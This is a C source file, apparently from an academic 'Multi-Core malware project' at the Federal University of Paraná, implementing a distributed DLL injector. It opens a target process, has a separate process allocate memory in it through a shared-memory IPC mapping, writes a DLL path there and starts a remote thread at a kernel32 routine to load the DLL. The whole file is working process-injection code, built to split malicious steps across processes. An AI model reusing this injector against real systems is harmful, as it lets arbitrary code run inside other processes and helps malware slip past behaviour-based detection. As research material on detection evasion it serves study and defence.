/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* Include block */
#include<windows.h>
#include<stdio.h>
#include<string.h>
#include "functions.h"
#include "IPC.h"

/* just one "remote" function */
HANDLE VIRTUALALLOC_IPC(HANDLE proc,int size)
{
	IPC data;
	HANDLE hMapFile;
	LPVOID map;
	
	/* Create mappings for IPC */
	hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(IPC),map_name);      
	
	/* check error */
	if(!hMapFile)
	{
		printf("CreateFileMap error\n");
		return NULL;
	}

	map = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,sizeof(IPC));
	if(!map)
	{
		printf("MapView error\n");
		return NULL;
	}

	/* Fill IPC struct */
	data.parent_pid=GetCurrentProcessId();
	data.size = size;
	data.proc = proc;
	data.lib=0;

	/* "Send" data */
	CopyMemory(map, &data, sizeof(data));

	/* wait for human */
	getchar();

	data.lib=PIPC(map)->lib;

	/* finish "remote" part */
	UnmapViewOfFile(map);
	CloseHandle(hMapFile);

	return data.lib;
}

/* "local" injector */
void inject(char *dll,int pid)
{
	/* open process handler locally */
	printf("1. 1/6. OpenProc\n");
	HANDLE proc = OPENPROC(pid);
	if(!proc)
	{
		printf("OpenProc error\n");
		exit(0);
	}

	int size= (strlen(dll)+1)*sizeof(char);
	
	/* Allocate using IPC */
	LPVOID alloc = VIRTUALALLOC_IPC(proc,size);
	if(!alloc)
	{
		printf("VirtualAlloc error\n");
		exit(0);
	}
	
	/* Keep injecting locally */
	printf("1. 3/6 WriteProc\n");
	BOOL write = WRITEPROC( proc, alloc,dll, size);
	if(!write)
	{
		printf("WriteProcMem error %d\n",GetLastError());
		exit(0);
	}

	printf("1. 4/6 GetModule\n");
	HMODULE k32 = GetModule();
	
	if(!k32)
	{
		printf("GetModule error\n");
		exit(0);
	}

	printf("1. 5/6 GetThreadStart\n");
	PTHREAD_START_ROUTINE tStart = GetThreadStart(k32);
	if(!tStart)
	{
		printf("GetThreadStart error\n");
		exit(0);
	}

	printf("1. 6/6 CreateThread\n");
	HANDLE thread = CreateThread(proc,tStart,alloc);
	if(!thread)
	{
		printf("CreateThread error\n");
		exit(0);
	}

	WaitForSingleObject(thread, INFINITE);
	DWORD ExitCode; 
 	if (!GetExitCodeThread(thread,&ExitCode))
	{
		printf("GetExitCode error\n");
		exit(0);
	}

	printf("Exit code: %x\n",ExitCode);
}

/* main */
int main(int argc, char *argv[])
{
	/* as in thread's case */
	int pid = atoi(argv[2]);
	char *dll=argv[1];
	inject(dll,pid);
	return 0;
}